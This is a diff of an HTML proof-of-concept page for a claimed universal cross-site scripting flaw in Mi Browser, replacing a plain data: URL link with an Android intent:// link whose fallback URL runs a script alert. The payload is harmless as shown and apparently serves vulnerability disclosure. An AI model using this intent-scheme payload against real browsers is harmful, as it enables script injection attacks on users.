@@ -1,19 +1,8 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Mi Browser UXSS PoC</title>
-  <style>
-    body { background:#111; color:#0f0; font-family: monospace; text-align:center; padding:50px; }
-    a { display:inline-block; margin-top:20px; padding:15px 25px; background:#0f0; color:#111; font-weight:bold; text-decoration:none; border-radius:8px; }
-  </style>
-</head>
-<body>
-  <h1>⚡ Mi Browser UXSS PoC ⚡</h1>
-  <p>Klik tombol di bawah → Mi Browser buka payload `data:` → execute JS.</p>
-
-  <!-- Link payload -->
-  <a href="data:text/html,&lt;script&gt;alert('MiBrowser-UXSS:'+document.domain)&lt;/script&gt;">
-    🚀 Trigger UXSS
-  </a>
-</body>
+  <body>
+    <a href="intent://anything/#Intent;scheme=data;S.browser_fallback_url=data:text/html,&lt;script&gt;alert('MiBrowser-UXSS')&lt;/script&gt;;end">
+      🚀 Trigger UXSS in Mi Browser
+    </a>
+  </body>
 </html>
